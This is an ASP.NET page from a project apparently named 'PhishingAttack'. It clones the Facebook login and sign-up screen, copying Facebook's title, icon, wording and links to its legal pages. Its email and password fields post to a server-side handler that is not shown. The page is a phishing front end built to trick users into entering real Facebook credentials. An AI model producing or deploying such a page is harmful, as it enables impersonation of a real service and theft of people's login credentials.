<%@ Page Language="C#" AutoEventWireup="true" CodeBehind="facebook.aspx.cs" Inherits="PhishingAttack.facebook" %>

<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">

<html xmlns="http://www.w3.org/1999/xhtml">
<head runat="server">
    <title>Facebook</title>
    <link rel="icon" href="images/facebook icon.png" type="images/gif" sizes="16*16" />
    <link rel="Stylesheet" href="css/facebook.css" type="text/css" />

</head>


<body style="height:815px">

  <form id="form4" runat="server">
 <div class="headerx">

</div>
<div class="header">
<div id="img1" class="header"> Facebook </div>
<div id="form1" class="header"> Email or phone <br>
    <asp:TextBox ID="txtUserName" runat="server" placeholder="Email"></asp:TextBox> <br>
</div>

<div id="form2" class="header"> Password <br>
    <asp:TextBox ID="txtPassword" runat="server" placeholder="Password"> </asp:TextBox> <br>
Forgotten account? </div>
</div>
  <asp:Button ID="submit" runat="server" class="submit1" Text="Log In" 
      onclick="submit_Click1" />
 <div class="bodyx">
<div id="intro1" class="bodyx">Facebook helps you connect and share with the people in your life.</div> 
 <div id="intro2" class="bodyx">Create an account.</div>
 <div id="img2" class="bodyx"> <img src="images/facebook connect image.png"/> </div>
 <div id="intro3" class="bodyx"> It's quick and easy.</div>
 <div id="form3" class="bodyx"> 
 	<input placeholder="firstname" type="text" id="namebox" name="name1"/>
	<input placeholder="lastname" type="text" id="namebox"/> <br>
	<input placeholder="Email" type="text" id="mailbox"/> <br>
    <input placeholder="password" type="password" id="mailboxpass"/> <br>
    <br>
    <div id="intro4"> Date of birth</div>
    
<input type="date" id="nameboxdate"/> <br> 
<div id="intro5"> Gender</div>
<input type="radio" name="sex" value="male"/> Male
<input type="radio" name="sex" value="female"/> Female 
<input type="radio" name="sex" value="female"/> Custom 

<br> 
<div id="intro6"> By clicking Sign Up, you agree to our <a href="https://www.facebook.com/legal/terms/update">Terms</a>, <a href="https://www.facebook.com/about/privacy/update">Data Policy</a> and <a href="https://www.facebook.com/policies/cookies/">Cookie Policy</a>. You may receive SMS notifications from us and can opt out at any time. </div> <br> <br>
<div id="intro7"><a href="https://www.facebook.com/pages/create/?ref_type=registration_form"> Create a Page</a> for a celebrity, band or business. </div>
</div>
</div>
  <input type="submit" class="button2" value="Sign Up"/>
 	</form>
</body>
</html>
